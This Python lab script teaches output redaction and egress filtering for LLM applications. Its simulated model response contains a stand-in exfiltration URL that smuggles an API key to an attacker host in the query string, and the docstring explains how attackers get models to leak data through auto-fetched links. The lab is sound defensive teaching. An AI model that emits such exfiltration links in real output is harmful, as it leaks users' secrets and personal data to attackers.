#!/usr/bin/env python3
"""
LAB SE7: Sensitive-data disclosure and exfiltration prevention (LLM02).

Two ways sensitive data leaves an LLM app. It leaks PASSIVELY when the model
includes a secret or PII in an ordinary answer. It is exfiltrated ACTIVELY when an
attacker gets the model to smuggle data out through a channel the app trusts, the
classic trick being a URL or markdown image the app auto-fetches, with the secret
in the query string. Both are stopped on the way out, not by asking the model
nicely.

In this lab the naive app returns a response containing a customer email and an
API key, and it renders an attacker-planted tracking URL with a secret in it. The
hardened app runs output DLP that redacts PII and secret patterns, and an egress
filter that refuses to emit outbound links to untrusted hosts. The data stays in.

Run: python3 modules/academy-content/labs/ai-security/se7-data-exfiltration.py
"""
import sys, os
_cands = [os.path.join(os.path.dirname(__file__), "..") if "__file__" in globals() else None,
          os.path.join(os.getcwd(), "..", "labs"), os.path.join(os.getcwd(), "labs")]
for _c in _cands:
    if _c and os.path.exists(os.path.join(_c, "academy_llm.py")):
        sys.path.insert(0, os.path.abspath(_c)); break
import re

# A model response that, left alone, would leak. It carries PII, a secret, and an
# attacker-planted exfiltration URL (secret smuggled in the query string).
raw_response = ("Sure. The account belongs to jane.doe@example.com, "
                "API key sk-live-9f8e7d6c5b4a3210, SSN 512-34-5678. "
                "See details at http://exfil.attacker-node.net/x?leak=sk-live-9f8e7d6c5b4a3210")

# ── Output DLP: redact secret and PII patterns before anything ships ─────────────
DLP_PATTERNS = [
    ("EMAIL",   re.compile(r"[\w.+-]+@[\w-]+\.[\w.-]+")),
    ("API_KEY", re.compile(r"\bsk-[a-z0-9-]{8,}\b", re.I)),
    ("SSN",     re.compile(r"\b\d{3}-\d{2}-\d{4}\b")),
]

# ── Egress filter: only these hosts may appear in an outbound link ───────────────
ALLOWED_HOSTS = {"example.com", "support.example.com"}
URL_RE = re.compile(r"https?://([^/\s]+)(\S*)", re.I)


def redact(text):
    out = text
    for label, pat in DLP_PATTERNS:
        out = pat.sub("[REDACTED_%s]" % label, out)
    return out


def egress_filter(text):
    """Remove any URL whose host is not on the allowlist. This kills the
    exfiltration channel even if the secret survived (defense in depth)."""
    def _check(m):
        host = m.group(1).lower()
        base = ".".join(host.split(".")[-2:])  # registrable domain, roughly
        if base in ALLOWED_HOSTS:
            return m.group(0)
        return "[BLOCKED_URL]"
    return URL_RE.sub(_check, text)


def naive_app(response):
    """Ships the model output verbatim."""
    return response


def hardened_app(response):
    """DLP redaction, then egress filtering, before the response leaves."""
    return egress_filter(redact(response))


naive_out = naive_app(raw_response)
hard_out = hardened_app(raw_response)

print("NAIVE output:")
print("  %s" % naive_out)
print("")
print("HARDENED output:")
print("  %s" % hard_out)

# Naive leaked the email, key, SSN, and rendered the exfil URL.
naive_leaked = ("jane.doe@example.com" in naive_out
                and "sk-live-9f8e7d6c5b4a3210" in naive_out
                and "512-34-5678" in naive_out
                and "exfil.attacker-node.net" in naive_out)

# Hardened emitted none of them and blocked the outbound link.
hard_clean = ("jane.doe@example.com" not in hard_out
              and "sk-live-9f8e7d6c5b4a3210" not in hard_out
              and "512-34-5678" not in hard_out
              and "exfil.attacker-node.net" not in hard_out
              and "[BLOCKED_URL]" in hard_out)

print("")
print("  naive leaked PII + secret + exfil URL   : %s" % naive_leaked)
print("  hardened redacted and blocked egress    : %s" % hard_clean)

ok = naive_leaked and hard_clean
print("")
print("SECRET/PII EXFIL SUCCEEDED ON NAIVE, REDACTED/BLOCKED ON HARDENED: %s" % ("YES" if ok else "NO"))
if not ok:
    sys.exit(1)
print("Data leaves on the way out or not at all. Redact secrets, allowlist egress. Next: red-team your own app.")
